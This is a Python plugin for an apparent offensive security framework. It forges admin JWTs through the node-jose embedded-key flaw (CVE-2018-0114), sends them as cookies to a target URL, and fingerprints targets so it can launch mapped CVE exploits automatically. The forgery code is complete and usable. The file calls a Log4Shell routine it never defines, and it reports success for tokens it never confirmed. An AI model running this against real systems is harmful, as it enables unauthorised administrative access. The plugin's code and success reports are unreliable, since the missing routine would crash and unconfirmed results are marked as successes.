import requests
import json
import re
from typing import Dict, List, Any
from cybershell.plugins import PluginBase

class CVEResearchPlugin(PluginBase):
    def __init__(self):
        super().__init__()
        self.name = "CVEResearchPlugin"
        self.description = "Research and exploit known CVEs"
        
    def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        cve_id = context.get('cve_id', '')
        target_info = context.get('target_info', {})
        
        if cve_id:
            return self._exploit_specific_cve(cve_id, target_info)
        else:
            return self._discover_and_exploit_cves(target_info)
    
    def _exploit_specific_cve(self, cve_id: str, target_info: Dict) -> Dict[str, Any]:
        """Exploit a specific CVE (like XBOW did with CVE-2018-0114)"""
        
        # CVE-2018-0114 (node-jose) exploitation
        if cve_id == "CVE-2018-0114":
            return self._exploit_cve_2018_0114(target_info)
        
        # Add more CVE-specific exploits
        elif cve_id == "CVE-2021-44228":  # Log4Shell
            return self._exploit_log4shell(target_info)
            
        return {'success': False, 'error': f'No exploit available for {cve_id}'}
    
    def _exploit_cve_2018_0114(self, target_info: Dict) -> Dict[str, Any]:
        """CVE-2018-0114 node-jose JWT bypass (like XBOW implemented)"""
        import base64
        import json
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding
        
        target_url = target_info.get('url', '')
        
        # Generate RSA key pair for the attack
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        public_key = private_key.public_key()
        public_numbers = public_key.public_numbers()
        
        # Create JWK with our public key
        jwk = {
            "kty": "RSA",
            "e": base64.urlsafe_b64encode(
                public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')
            ).decode().rstrip('='),
            "n": base64.urlsafe_b64encode(
                public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')
            ).decode().rstrip('='),
            "kid": "attacker-key"
        }
        
        # Craft malicious header with embedded JWK
        header = {
            "alg": "RS256",
            "jwk": jwk
        }
        
        payload = {"user": "admin", "admin": True}
        
        # Encode and sign
        encoded_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        
        encoded_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        message = f"{encoded_header}.{encoded_payload}".encode()
        signature = private_key.sign(message, padding.PKCS1v15(), hashes.SHA256())
        encoded_signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        malicious_jwt = f"{encoded_header}.{encoded_payload}.{encoded_signature}"
        
        # Test the exploit
        if target_url:
            try:
                response = requests.get(target_url, cookies={'auth': malicious_jwt})
                if "admin" in response.text.lower():
                    return {
                        'success': True,
                        'jwt': malicious_jwt,
                        'evidence_score': 0.95,
                        'response': response.text[:500]
                    }
            except Exception as e:
                pass
                
        return {
            'success': True,
            'jwt': malicious_jwt,
            'evidence_score': 0.8,
            'note': 'JWT generated, manual testing required'
        }
    
    def _discover_and_exploit_cves(self, target_info: Dict) -> Dict[str, Any]:
        """Automatically discover and exploit CVEs based on target fingerprinting"""
        
        # Fingerprint the target
        fingerprints = self._fingerprint_target(target_info)
        
        # Map fingerprints to known CVEs
        cve_mappings = {
            'node-jose': ['CVE-2018-0114'],
            'log4j': ['CVE-2021-44228'],
            'spring': ['CVE-2022-22965'],
            'apache': ['CVE-2021-41773'],
            'nginx': ['CVE-2019-20372']
        }
        
        results = []
        for tech, cves in cve_mappings.items():
            if tech in fingerprints:
                for cve in cves:
                    result = self._exploit_specific_cve(cve, target_info)
                    if result.get('success'):
                        results.append(result)
        
        return {
            'success': len(results) > 0,
            'exploits': results,
            'evidence_score': max([r.get('evidence_score', 0) for r in results], default=0)
        }
    
    def _fingerprint_target(self, target_info: Dict) -> List[str]:
        """Fingerprint target technologies"""
        url = target_info.get('url', '')
        fingerprints = []
        
        try:
            response = requests.get(url, timeout=10)
            headers = response.headers
            content = response.text
            
            # Check server headers
            server = headers.get('Server', '').lower()
            if 'nginx' in server:
                fingerprints.append('nginx')
            if 'apache' in server:
                fingerprints.append('apache')
                
            # Check for JavaScript libraries
            if 'node-jose' in content:
                fingerprints.append('node-jose')
                
            # Check for Java indicators
            if any(x in content.lower() for x in ['java', 'spring', 'log4j']):
                fingerprints.append('spring')
                fingerprints.append('log4j')
                
        except Exception:
            pass
            
        return fingerprints
